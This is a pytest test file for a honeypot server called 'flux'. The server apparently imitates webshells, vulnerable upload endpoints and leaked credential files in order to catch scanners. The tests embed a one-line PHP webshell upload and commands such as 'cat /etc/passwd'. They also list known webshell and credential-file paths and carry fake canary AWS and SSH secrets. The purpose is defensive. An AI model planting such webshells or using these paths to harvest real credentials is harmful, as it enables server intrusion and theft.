"""Tests for flux.server."""
from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import re

import aiohttp
import pytest

from flux import server as tbenv


def test_default_webshell_paths_include_azure_wp_checker_anchor():
    """The Azure WP Webshell Checker anchor (hellopress/wp_filemanager.php)
    plus all observed short-named PHPs from the April 2026 burst must match."""
    must_match = [
        "/wp-content/plugins/hellopress/wp_filemanager.php",
        "/hellopress/wp_filemanager.php",
        "/doc.php",
        "/ws80.php",
        "/bthil.php",
        "/xminie.php",
        "/inputs.php",
        "/ioxi-o.php",
        "/8.php",
        "/an.php",
        "/kma.php",
        "/ssh3ll.php",
        "/new4.php",
        "/sf.php",
    ]
    for path in must_match:
        assert tbenv.is_webshell_path(path), f"expected webshell match: {path}"


def test_default_webshell_paths_include_style_php_family():
    """style.php is a recurring webshell-rename: legitimate WordPress serves
    style.css, never style.php, so any /style.php — at the root or under any of
    the four standard WP directory prefixes — is the scanner's confirmation
    fingerprint. The bare /js/style.php and /wp-style.php variants share the
    same intent."""
    must_match = [
        "/style.php",
        "/wp-style.php",
        "/wp-admin/style.php",
        "/wp-content/style.php",
        "/wp-content/themes/style.php",
        "/wp-includes/style.php",
        "/js/style.php",
    ]
    for path in must_match:
        assert tbenv.is_webshell_path(path), f"expected webshell match: {path}"


def test_style_css_is_not_a_webshell_path():
    """The .css cousin is the legitimate WP file and must stay 404 so we
    don't mistake real-browser fetches for scanner traffic."""
    for path in [
        "/style.css",
        "/wp-content/style.css",
        "/wp-content/themes/twentytwentyfour/style.css",
    ]:
        assert not tbenv.is_webshell_path(path), f"unexpected match: {path}"


def test_webshell_path_is_case_insensitive():
    assert tbenv.is_webshell_path("/WP-Content/Plugins/HelloPress/WP_FILEMANAGER.PHP")


def test_non_webshell_path_does_not_match():
    for path in ["/", "/.env", "/index.html", "/wp-login.php"]:
        assert not tbenv.is_webshell_path(path)


def test_webshell_path_regexes_match_well_known_php_shells():
    """The /.well-known/<name>.php pattern is used as a shell-drop directory
    (writable by the certbot user on many LAMP boxes). Scanners probe a rotating
    set of filenames there."""
    for path in [
        "/.well-known/rk2.php",
        "/.well-known/gecko-litespeed.php",
        "/.well-known/admin.php",
        "/.well-known/error.php",
        "/.well-known/index.php",
        "/.WELL-KNOWN/RK2.PHP",
    ]:
        assert tbenv.is_webshell_path(path), f"expected match: {path}"


def test_webshell_regex_excludes_well_known_acme_challenge():
    """nginx routes /.well-known/acme-challenge/ to the LE webroot, not flux,
    but even if it did hit flux we shouldn't trap on it — legit cert renewals
    would fire the shell dispatch path. The regex only matches <name>.php, not
    subdirectory tokens."""
    assert not tbenv.is_webshell_path("/.well-known/acme-challenge/")
    assert not tbenv.is_webshell_path("/.well-known/acme-challenge/abc123")


def test_webshell_regex_matches_numbered_trash_directories():
    """Numbered /.trash<N>/ and /.tmb/ staging paths are a specific malware
    family's shell-drop convention."""
    for path in [
        "/.trash7206/index.php",
        "/.trash7309/f/",
        "/.trash99/",
        "/.tmb/shell.php",
        "/.tresh/index.php",
        "/.dj/index.php",
        "/.alf/index.php",
        "/.mopj.php",
        "/.info.php",
    ]:
        assert tbenv.is_webshell_path(path), f"expected match: {path}"


def test_webshell_regex_rejects_benign_hidden_dirs():
    """Dot-directories we do NOT want to snag (other canary traps own some of
    these, and legitimate framework paths use others)."""
    for path in [
        "/.env",
        "/.git/HEAD",
        "/.ssh/authorized_keys",
        "/.aws/credentials",
        "/.well-known/openid-configuration",   # standards-defined non-.php
        "/.trash",                              # bare name, no numbered dir
    ]:
        assert not tbenv.is_webshell_path(path), f"unexpected match: {path}"


# --- File-upload trap (KCFinder / jquery.filer / blueimp jQuery-File-Upload) ---

@pytest.mark.parametrize("path,family", [
    # KCFinder — bare + arbitrary webroot prefix variants
    ("/kcfinder/upload.php", "kcfinder"),
    ("/kcfinder/browse.php", "kcfinder"),
    ("/admin/ckeditor/plugins/kcfinder/upload.php", "kcfinder"),
    ("/admin/ckeditor/kcfinder/browse.php", "kcfinder"),
    ("/admin/core/kcfinder/upload.php", "kcfinder"),
    ("/admin/js/kcfinder/upload.php", "kcfinder"),
    ("/app/webroot/kcfinder/upload.php", "kcfinder"),
    ("/app/webroot/js/kcfinder/upload.php", "kcfinder"),
    ("/asset/kcfinder/upload.php", "kcfinder"),
    ("/asset/plugins/kcfinder/browse.php", "kcfinder"),
    ("/assets/kcfinder/browse.php", "kcfinder"),
    ("/assets/js/kcfinder/upload.php", "kcfinder"),
    ("/assets/plugins/kcfinder/upload.php", "kcfinder"),
    ("/ckeditor/kcfinder/upload.php", "kcfinder"),
    ("/components/kcfinder/upload.php", "kcfinder"),
    ("/core/scripts/kcfinder/upload.php", "kcfinder"),
    ("/core/scripts/wysiwyg/kcfinder/upload.php", "kcfinder"),
    ("/js/kcfinder/upload.php", "kcfinder"),
    ("/jquery/kcfinder/upload.php", "kcfinder"),
    ("/plugins/kcfinder/browse.php", "kcfinder"),
    ("/KCFinder/Upload.php", "kcfinder"),  # case-insensitive
    # jquery.filer
    ("/jquery.filer/php/readme.txt", "jquery-filer"),
    ("/jquery.filer/php/upload.php", "jquery-filer"),
    ("/assets/plugins/jquery.filer/php/readme.txt", "jquery-filer"),
    ("/public/assets/plugins/jquery.filer/php/upload.php", "jquery-filer"),
    ("/JQUERY.FILER/PHP/upload.php", "jquery-filer"),
    # Blueimp jQuery-File-Upload
    ("/jquery-file-upload/server/php/", "blueimp-jquery-file-upload"),
    ("/jquery-file-upload/server/php", "blueimp-jquery-file-upload"),
    ("/static/lib/jquery-file-upload/server/php/", "blueimp-jquery-file-upload"),
    ("/assets/global/plugins/jquery-file-upload/server/php/", "blueimp-jquery-file-upload"),
])
def test_is_file_upload_path_matches(path, family):
    assert tbenv.is_file_upload_path(path), f"unexpected miss: {path}"
    assert tbenv._file_upload_family(path) == family


@pytest.mark.parametrize("path", [
    # Looks-like-but-isn't (no leaf file)
    "/kcfinder/",
    "/kcfinder",
    "/jquery.filer/",
    "/jquery.filer/php/",
    # Other static files in the same dirs we don't want to claim
    "/kcfinder/themes/oxygen/style.css",
    "/kcfinder/js/kcfinder.js",
    "/jquery.filer/css/style.css",
    # The webshell trap and the body-RCE trap own these paths
    "/upload.php",
    "/shell.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    # Webapp-form / canary traps own these
    "/login",
    "/.env",
    "/.aws/credentials",
])
def test_is_file_upload_path_rejects(path):
    assert not tbenv.is_file_upload_path(path), f"unexpected match: {path}"


def test_is_file_upload_path_disabled_when_env_off(monkeypatch):
    monkeypatch.setattr(tbenv, "FILE_UPLOAD_ENABLED", False)
    assert not tbenv.is_file_upload_path("/kcfinder/upload.php")
    assert not tbenv.is_file_upload_path("/jquery.filer/php/upload.php")


def test_extract_multipart_parts_pulls_filename_and_php_shell():
    boundary = "----WebKitFormBoundaryABC123"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="upload[]"; filename="shell.php"\r\n'
        "Content-Type: application/x-php\r\n"
        "\r\n"
        "<?php system($_GET['cmd']); ?>\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    names, filenames, content_types, has_php_shell = tbenv.extract_multipart_parts(
        body, f"multipart/form-data; boundary={boundary}", 16,
    )
    assert names == ["upload[]"]
    assert filenames == ["shell.php"]
    assert content_types == ["application/x-php"]
    assert has_php_shell is True


def test_extract_multipart_parts_ignores_empty_filename():
    """A plain text field (no filename=) should land in `names` but not `filenames`."""
    boundary = "BNDRY"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="csrf_token"\r\n'
        "\r\n"
        "abc123\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename=""\r\n'
        "Content-Type: application/octet-stream\r\n"
        "\r\n"
        "\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    names, filenames, _, has_php_shell = tbenv.extract_multipart_parts(
        body, f"multipart/form-data; boundary={boundary}", 16,
    )
    assert "csrf_token" in names
    assert "file" in names
    assert filenames == []  # empty filename="" doesn't count as an uploaded file
    assert has_php_shell is False


def test_extract_multipart_parts_handles_non_multipart():
    assert tbenv.extract_multipart_parts(b"plain text", "text/plain", 16) == ([], [], [], False)
    assert tbenv.extract_multipart_parts(b"", "multipart/form-data; boundary=x", 16) == ([], [], [], False)


def test_extract_multipart_parts_caps_at_max():
    boundary = "B"
    pieces = []
    for i in range(5):
        pieces.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"\r\n'
            "\r\n"
            f"v{i}\r\n"
        )
    pieces.append(f"--{boundary}--\r\n")
    body = "".join(pieces).encode("utf-8")
    names, _, _, _ = tbenv.extract_multipart_parts(
        body, f"multipart/form-data; boundary={boundary}", 2,
    )
    assert names == ["f0", "f1"]


def test_render_kcfinder_browse_html_carries_upload_form():
    html = tbenv.render_kcfinder_browse_html()
    assert b"KCFinder" in html
    assert b'enctype="multipart/form-data"' in html
    assert b'name="upload[]"' in html


def test_render_jquery_filer_readme_has_expected_marker():
    body = tbenv.render_jquery_filer_readme()
    assert b"jQuery.filer" in body
    assert b"php/upload.php" in body


def test_render_jquery_filer_upload_response_emits_json():
    body = tbenv.render_jquery_filer_upload_response(["evil.php", "ok.txt"])
    obj = json.loads(body)
    assert obj["OK"] == 1
    assert {f["name"] for f in obj["files"]} == {"evil.php", "ok.txt"}


def test_render_kcfinder_upload_response_one_line_per_filename():
    body = tbenv.render_kcfinder_upload_response(["a.php", "b.png"])
    lines = body.decode("utf-8").splitlines()
    assert lines == ["/a.php", "/b.png"]


def test_parse_cookies_basic():
    result = tbenv.parse_cookies("sid=abc; cmd=id; _hp_tid=xyz")
    assert result == {"sid": "abc", "cmd": "id", "_hp_tid": "xyz"}


def test_parse_cookies_empty():
    assert tbenv.parse_cookies("") == {}


def test_parse_form_body_urlencoded():
    body = b"cmd=id&x=y&empty="
    result = tbenv.parse_form_body(body, "application/x-www-form-urlencoded")
    assert result == {"cmd": ["id"], "x": ["y"], "empty": [""]}


def test_parse_form_body_ignores_non_form_content_type():
    """JSON body shouldn't be parsed as form data; we want to see it in bodyPreview instead."""
    assert tbenv.parse_form_body(b'{"cmd":"id"}', "application/json") == {}


def test_parse_form_body_treats_missing_content_type_as_form():
    """Many shell clients omit Content-Type entirely."""
    assert tbenv.parse_form_body(b"cmd=id", "") == {"cmd": ["id"]}


class _FakeHeaders(dict):
    def get(self, key, default=""):  # case-insensitive like HTTPMessage
        for k, v in self.items():
            if k.lower() == key.lower():
                return v
        return default


def test_extract_webshell_command_from_query():
    source, key, cmd = tbenv.extract_webshell_command(
        {"cmd": ["id"]}, {}, {}, _FakeHeaders(),
    )
    assert (source, key, cmd) == ("query", "cmd", "id")


def test_extract_webshell_command_from_form():
    source, key, cmd = tbenv.extract_webshell_command(
        {}, {"command": ["whoami"]}, {}, _FakeHeaders(),
    )
    assert (source, key, cmd) == ("form", "command", "whoami")


def test_extract_webshell_command_prefers_query_over_form():
    """Scanners sometimes set both; query-string is the more common observed channel."""
    source, key, cmd = tbenv.extract_webshell_command(
        {"c": ["from_query"]}, {"c": ["from_form"]}, {}, _FakeHeaders(),
    )
    assert source == "query"
    assert cmd == "from_query"


def test_extract_webshell_command_from_cookie():
    source, key, cmd = tbenv.extract_webshell_command(
        {}, {}, {"cmd": "uname -a"}, _FakeHeaders(),
    )
    assert (source, key, cmd) == ("cookie", "cmd", "uname -a")


def test_extract_webshell_command_from_header():
    headers = _FakeHeaders({"X-Cmd": "id"})
    source, key, cmd = tbenv.extract_webshell_command({}, {}, {}, headers)
    assert source == "header"
    assert cmd == "id"


def test_extract_webshell_command_none():
    source, key, cmd = tbenv.extract_webshell_command({}, {}, {}, _FakeHeaders())
    assert (source, key, cmd) == ("", "", "")


def test_extract_webshell_command_case_variant_param_name():
    """Some shells use uppercase CMD."""
    source, key, cmd = tbenv.extract_webshell_command(
        {"CMD": ["id"]}, {}, {}, _FakeHeaders(),
    )
    assert source == "query"
    assert cmd == "id"


def test_simulate_command_output_id():
    assert "uid=33(www-data)" in tbenv.simulate_command_output("id")


def test_simulate_command_output_whoami():
    assert tbenv.simulate_command_output("whoami").strip() == "www-data"


def test_simulate_command_output_uname():
    out = tbenv.simulate_command_output("uname -a")
    assert "Linux" in out and "GNU/Linux" in out


def test_simulate_command_output_cat_etc_passwd():
    out = tbenv.simulate_command_output("cat /etc/passwd")
    assert "root:x:0:0" in out
    assert "www-data" in out


def test_simulate_command_output_unknown_empty():
    """Unknown commands return empty output rather than an error banner,
    so the response looks like a silently-run command."""
    assert tbenv.simulate_command_output("some_fake_bin --flag") == ""


def test_simulate_command_output_empty_input():
    assert tbenv.simulate_command_output("") == ""


def test_render_webshell_page_includes_form_and_command():
    html = tbenv.render_webshell_page(command="id", output="uid=33")
    assert b"<form" in html
    assert b"name='cmd'" in html
    assert b"id" in html
    assert b"uid=33" in html


def test_render_webshell_page_escapes_html():
    html = tbenv.render_webshell_page(command="<script>alert(1)</script>", output="")
    assert b"<script>" not in html
    assert b"&lt;script&gt;" in html


def test_render_webshell_page_empty_is_still_valid():
    html = tbenv.render_webshell_page()
    assert html.startswith(b"<!doctype html>")
    assert b"File Manager" in html


def test_webshell_disabled_returns_false_even_for_anchor_path(monkeypatch):
    monkeypatch.setattr(tbenv, "WEBSHELL_ENABLED", False)
    assert not tbenv.is_webshell_path(
        "/wp-content/plugins/hellopress/wp_filemanager.php",
    )


# --- End-to-end dispatch tests (gate behavior) ---
#
# Use pytest-aiohttp's aiohttp_client fixture: a real aiohttp server bound to
# a random port in the test event loop, hit with an HTTP client. Mocks the
# Tracebit call at the module level via monkeypatch so tests stay offline.


import pytest_asyncio


@pytest_asyncio.fixture
async def flux_client(aiohttp_client, monkeypatch, tmp_path):
    """Spin up the real aiohttp app; return a TestClient ready to hit it.
    Routes LOG_PATH to tmp_path so each test gets its own log file."""
    monkeypatch.setattr(tbenv, "LOG_PATH", tmp_path / "env-canary.jsonl")
    app = tbenv.create_app()
    client = await aiohttp_client(app)
    client.log_path = tmp_path / "env-canary.jsonl"
    return client


def _log_entries(log_path):
    import json
    return [json.loads(line) for line in log_path.read_text().splitlines()]


async def test_dispatch_serves_webshell_when_host_is_spoofed(flux_client, monkeypatch):
    """Scanner with a spoofed Host header still gets the webshell response —
    flux serves traps regardless of Host."""
    monkeypatch.setattr(tbenv, "WEBSHELL_ENABLED", True)
    resp = await flux_client.get(
        "/wp-content/plugins/hellopress/wp_filemanager.php",
        headers={
            "X-Forwarded-Host": "staging.victim.example",
            "X-Forwarded-For": "203.0.113.7",
            "X-Forwarded-Proto": "https",
        },
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"File Manager" in body
    entries = _log_entries(flux_client.log_path)
    assert len(entries) == 1
    assert entries[0]["result"] == "webshell-probe"
    assert entries[0]["clientIp"] == "203.0.113.7"


async def test_dispatch_webshell_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "WEBSHELL_ENABLED", False)
    resp = await flux_client.get(
        "/wp-content/plugins/hellopress/wp_filemanager.php",
        headers={"X-Forwarded-For": "203.0.113.7"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert len(entries) == 1
    assert entries[0]["result"] == "not-handled"


async def test_dispatch_without_tracebit_api_key_404s_env_and_git(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "")
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    for path in ["/.env", "/.git/HEAD", "/.git/config"]:
        resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.8"})
        assert resp.status == 404, f"expected 404 for {path} without API_KEY"


# --- Fingerprint paths ---


def test_is_fingerprint_path_defaults_match_generic_paths():
    """Fingerprinting is on by default for the built-in generic paths."""
    assert tbenv.FINGERPRINT_PATHS_ENABLED, (
        "FINGERPRINT_PATHS_ENABLED should default to True — flux is a honeypot"
    )
    for path in ["/", "/index.html", "/index.php", "/robots.txt", "/sitemap.xml", "/favicon.ico"]:
        assert tbenv.is_fingerprint_path(path), f"expected match: {path}"


def test_is_fingerprint_path_respects_explicit_disable(monkeypatch):
    monkeypatch.setattr(tbenv, "FINGERPRINT_PATHS_ENABLED", False)
    assert not tbenv.is_fingerprint_path("/")
    assert not tbenv.is_fingerprint_path("/index.html")


def test_tarpit_modules_default_on():
    """All fingerprint modules default to on. A user who explicitly disables
    one via env var still wins; the defaults just mean a fresh sensor
    already fingerprints without any extra env tuning."""
    assert tbenv.MOD_COOKIE_ENABLED
    assert tbenv.MOD_ETAG_PROBE_ENABLED
    assert tbenv.MOD_REDIRECT_CHAIN_ENABLED
    assert tbenv.MOD_VARIABLE_DRIP_ENABLED
    assert tbenv.MOD_CONTENT_LENGTH_MISMATCH_ENABLED
    # DNS callback is default-on but is a no-op unless the domain is set.
    assert tbenv.MOD_DNS_CALLBACK_ENABLED


def test_all_trap_families_default_on():
    """Every trap master-switch defaults to on — flux is a honeypot, the
    whole point is to run every trap that's cheap to run. Deployments that
    lack TRACEBIT_API_KEY still 404 the canary-backed traps (/.env,
    /.git/*, canary file table) at dispatch time."""
    assert tbenv.TARPIT_ENABLED
    assert tbenv.FINGERPRINT_PATHS_ENABLED
    assert tbenv.CANARY_TRAPS_ENABLED
    assert tbenv.FAKE_GIT_ENABLED, (
        "FAKE_GIT_ENABLED should default to True — the per-IP cache bounds "
        "quota burn and the dispatch still requires TRACEBIT_API_KEY."
    )
    assert tbenv.WEBSHELL_ENABLED
    assert tbenv.FILE_UPLOAD_ENABLED
    assert tbenv.LLM_ENDPOINT_ENABLED
    assert tbenv.SONICWALL_ENABLED
    assert tbenv.CISCO_WEBVPN_ENABLED
    assert tbenv.IVANTI_VPN_ENABLED
    assert tbenv.ASPERA_FASPEX_ENABLED
    assert tbenv.FORTIGATE_VPN_ENABLED
    assert tbenv.HIKVISION_ENABLED
    assert tbenv.HNAP1_ENABLED
    assert tbenv.SERVER_STATUS_ENABLED
    assert tbenv.GEOSERVER_ENABLED
    assert tbenv.LIFERAY_ENABLED
    assert tbenv.COLDFUSION_ENABLED
    assert tbenv.CONFLUENCE_ENABLED
    assert tbenv.SAP_METADATAUPLOADER_ENABLED
    assert tbenv.GRAVITY_SMTP_ENABLED
    assert tbenv.CITRIX_GATEWAY_ENABLED
    assert tbenv.RDWEB_ENABLED
    assert tbenv.EXCHANGE_ENABLED
    assert tbenv.GLOBALPROTECT_ENABLED
    assert tbenv.SOPHOS_VPN_ENABLED
    assert tbenv.BARRACUDA_VPN_ENABLED
    assert tbenv.F5_BIGIP_ENABLED
    assert tbenv.DOCKER_REGISTRY_ENABLED
    assert tbenv.DOCKER_DAEMON_ENABLED
    assert tbenv.NEXTJS_ENABLED
    assert tbenv.CMD_INJECTION_ENABLED
    assert tbenv.PHP_CGI_LIVENESS_ENABLED
    assert tbenv.WEBAPP_FORM_ENABLED
    assert tbenv.OPENAPI_SWAGGER_ENABLED
    assert tbenv.DRUPAL_ENABLED
    assert tbenv.JOOMLA4_CONFIG_ENABLED
    assert tbenv.TOMCAT_PATH_BYPASS_ENABLED
    assert tbenv.SPRING_GATEWAY_ENABLED
    assert tbenv.BACKUP_ARCHIVE_ENABLED
    assert tbenv.WP_LOGIN_ENABLED
    assert tbenv.WP_USER_ENUM_ENABLED
    assert tbenv.GRAPHQL_ENABLED
    assert tbenv.TELESCOPE_ENABLED
    assert tbenv.OIDC_DISCOVERY_ENABLED
    assert tbenv.PHPMYADMIN_ENABLED


def test_tarpit_enabled_by_default():
    assert tbenv.TARPIT_ENABLED


@pytest.mark.parametrize("path", [
    # Regression: dispatch order in `handle()` runs the tarpit check
    # before the canary-trap lookup, so any path that matches both was
    # silently shadowed by tarpit and never reached the canary
    # renderer. `is_tarpit_path` now exempts paths with a CanaryTrap
    # entry so the canary fires as documented.
    "/.env.production",
    "/.env.prod",
    "/.env.live",
    "/.env.local",
    "/.env.dev",
    "/.env.development.local",
    "/.env.test.local",
    "/.env.staging",
    "/.env.example",
    "/.env.ci",
    "/.env.save",
    "/.env.private",
    "/.env.docker",
    "/.env.override",
    "/.env2",
    "/.env_bak",
    "/.env_old",
    "/.env_orig",
    "/.env_priv",
    "/.env_example",
    "/.environ",
    "/.env.vault",
    "/.env.vault.bak",
    "/.env.vault.example",
    "/mailer/.env",
    "/opt/.env",
    "/srv/.env",
    "/var/www/.env",
    "/app/.env",
    "/sendgrid/.env",
    "/postmark/.env",
    "/mailjet/.env",
    "/brevo/.env",
    "/mailgun/.env",
    "/mailing/.env",
    "/mail/.env",
    "/mailserver/.env",
])
def test_canary_trap_paths_do_not_match_tarpit(path):
    assert path.lower() in tbenv._TRAP_BY_PATH, (
        f"{path!r} should be a CanaryTrap entry"
    )
    assert not tbenv.is_tarpit_path(path), (
        f"{path!r} matches is_tarpit_path — tarpit dispatch (line 6806) "
        f"runs before canary dispatch and would shadow the canary trap"
    )


# --- Canary-backed file traps ---

FAKE_TRACEBIT = {
    "aws": {
        "awsAccessKeyId": "AKIAFAKEEXAMPLE01",
        "awsSecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "awsSessionToken": "FwoGZXIvYXdzEXAMPLEFAKE=",
        "awsExpiration": "2030-01-01T00:00:00Z",
        "awsConfirmationId": "conf-aws-1",
    },
    "ssh": {
        "sshIp": "203.0.113.99",
        "sshPrivateKey": "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEY\n-----END OPENSSH PRIVATE KEY-----",
        "sshPublicKey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE canary@flux",
        "sshExpiration": "2030-01-01T00:00:00Z",
        "sshConfirmationId": "conf-ssh-1",
    },
    "http": {
        "gitlab-username-password": {
            "credentials": {"username": "deploybot42", "password": "p@ssCanaryValue"},
            "hostNames": ["gitlab.canary.example"],
            "expiresAt": "2030-01-01T00:00:00Z",
            "browserDeploymentId": "bd-gup-1",
            "confirmationId": "conf-gup-1",
        },
        "gitlab-cookie": {
            "credentials": {"name": "_gitlab_session", "value": "cookieCanaryValue"},
            "hostNames": ["gitlab.canary.example"],
            "expiresAt": "2030-01-01T00:00:00Z",
            "browserDeploymentId": "bd-gc-1",
            "confirmationId": "conf-gc-1",
        },
    },
}


@pytest.mark.parametrize("path,needle", [
    ("/.aws/credentials", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    # Home-dir + webroot-prefix variants — same INI render shape; the
    # scanner-dict matrix walks these alongside `.boto`, `.bash_history`.
    ("/root/.aws/credentials", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/home/ubuntu/.aws/credentials", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/home/ec2-user/.aws/credentials", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/home/app/.aws/credentials", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    # Bare `/credentials` — webroot-dropped AWS INI shape.
    ("/credentials", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/.aws/config", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    # `.boto` is the AWS Python SDK / `gsutil` legacy config; same canary in
    # the `[Credentials]` section as `.aws/credentials`. Includes a per-profile
    # `[profile prod]` section that also carries the canary, so a per-section
    # grep still picks it up.
    ("/.boto", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/.boto", b"[profile prod]"),
    ("/.boto3", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/root/.boto", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/home/.boto", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    # `.amplifyrc` carries `accessKeyId` / `secretAccessKey` in JSON. Field-keyed
    # harvesters look for the camelCase keys, so place the canary there.
    ("/.amplifyrc", b'"accessKeyId": "AKIAFAKEEXAMPLE01"'),
    ("/.amplifyrc", b'"secretAccessKey":'),
    ("/.pgpass", b":deploybot42:p@ssCanaryValue"),
    # `.htpasswd` lines are `username:hash` — the canary value is the
    # username (`deploybot42`); the hash is per-hit bcrypt-shaped (not a
    # real bcrypt — see `_fake_bcrypt_hash`) so the file isn't a
    # fleet-wide fingerprint.
    ("/.htpasswd", b"deploybot42:$2y$10$"),
    ("/.htpasswd", b"admin:$2y$10$"),
    ("/.htpasswd", b"backup:$2y$10$"),
    ("/.claude/.credentials.json", b'"accessToken": "AKIAFAKEEXAMPLE01"'),
    ("/wp-config.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.old", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.save", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.txt", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.swp", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php~", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    # Leading-dot vim swap file — the naming convention real vim uses.
    ("/.wp-config.php.swp", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    # WP-shipped sample template + distribution-template siblings.
    ("/wp-config-sample.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.dist", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php::$data", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config-backup.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/backup/wp-config.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    # Absolute-webroot path-traversal variants — scanner dicts walk
    # canonical Apache / nginx install paths.
    ("/var/www/wp-config.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/var/www/html/wp-config.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/srv/www/wp-config.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/%77%70%2d%63%6f%6e%66%69%67.%70%68%70.%62%61%6b", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/backup.sql", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/config.json", b'"access_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/firebase.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/firebase-adminsdk.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/gcp-service-account.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/.config/gcloud/application_default_credentials.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/.docker/config.json", b'"auths"'),
    ("/docker-compose.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.prod.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.production.yaml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.staging.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.override.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/.github/workflows/ci.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/.gitlab-ci.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/jenkinsfile", b"AWS_ACCESS_KEY_ID = 'AKIAFAKEEXAMPLE01'"),
    ("/bitbucket-pipelines.yml", b"export AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/appveyor.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/actuator/env", b'"AWS_ACCESS_KEY_ID"'),
    ("/actuator/env", b'"value": "AKIAFAKEEXAMPLE01"'),
    ("/env", b'"activeProfiles"'),
    ("/manage/env", b'"activeProfiles"'),
    ("/management/env", b"applicationConfig"),
    ("/api/actuator/env", b"applicationConfig"),
    # Spring Boot Actuator surface beyond /env — every endpoint emits
    # the canary AWS access key id in a place a credential harvester
    # would grep raw bytes for.
    ("/actuator/heapdump", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/actuator/heapdump", b"JAVA PROFILE 1.0.2"),
    ("/api/actuator/heapdump", b"AWS_SECRET_ACCESS_KEY="),
    ("/manage/heapdump", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/actuator/configprops", b'"accessKey": "AKIAFAKEEXAMPLE01"'),
    ("/actuator/configprops", b'"prefix": "spring.datasource"'),
    ("/management/configprops", b'"accessKey": "AKIAFAKEEXAMPLE01"'),
    ("/actuator/health", b'"status": "UP"'),
    ("/actuator/health", b'"accessKeyId": "AKIAFAKEEXAMPLE01"'),
    ("/api/actuator/health", b"jdbc:postgresql://prod_rw:"),
    ("/actuator/mappings", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/mappings", b"dispatcherServlets"),
    ("/actuator/threaddump", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/threaddump", b'"threadState"'),
    # actuator-heapdump 1.x alias `/dump` — same render as `/heapdump`.
    ("/actuator/dump", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/manage/dump", b"JAVA PROFILE 1.0.2"),
